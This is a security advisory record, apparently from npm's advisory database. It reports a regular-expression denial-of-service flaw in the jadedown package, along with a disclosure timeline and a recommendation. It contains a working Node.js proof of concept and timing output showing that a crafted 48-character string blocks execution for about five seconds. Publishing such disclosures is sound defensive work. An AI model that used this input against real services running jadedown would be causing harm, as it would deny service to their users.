---
Publication-State: Active
Access: Public
Reviewers:
- Name: Adam Baldwin
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/jadedown
Review-Date: '2016-01-05'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Regular Expression Denial of Service*<br><br>Recommendation: There is currently no fix. Do not allow untrusted user input into `jadedown`
### Details
jadedown is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in.   "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time." [1]   ### Proof of concept ``` var jadedown = require('jadedown');  var genstr = function (len, chr) {     var result = "";     for (i=0; i<=len; i++) {         result = result + chr;     }      return result; }   for (i=1;i<=10000000;i=i+1) {     console.log("COUNT: " + i);     var str = genstr(i, 'f') + genstr(i, '#') + '{';     console.log("LENGTH: " + str.length);     var start = process.hrtime();     jadedown(str)      var end = process.hrtime(start);     console.log(end); }  ```  Results demonstrating blocking for 5 seconds using only 48 characters.  ``` $ node jadedown.js COUNT: 1 LENGTH: 6 [ 0, 4014065 ] COUNT: 4 LENGTH: 12 [ 0, 503507 ] COUNT: 7 LENGTH: 18 [ 0, 325225 ] COUNT: 10 LENGTH: 24 [ 0, 1632684 ] COUNT: 13 LENGTH: 30 [ 0, 7541230 ] COUNT: 16 LENGTH: 36 [ 0, 80889495 ] COUNT: 19 LENGTH: 42 [ 0, 636009936 ] COUNT: 22 LENGTH: 48 [ 5, 820586760 ] ```  # Timeline - October 24, 2015 - Vulnerability Identified - October 24, 2015 - Maintainers Notified - October 25, 2015 - Response from Maintainers with intent to fix - January 5, 2016 - Advisory Published - January 11, 2016 - CVE Requested
<br><br>• Affected Versions: <=99.999.99999
<br>• Patched Versions: <0.0.0
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
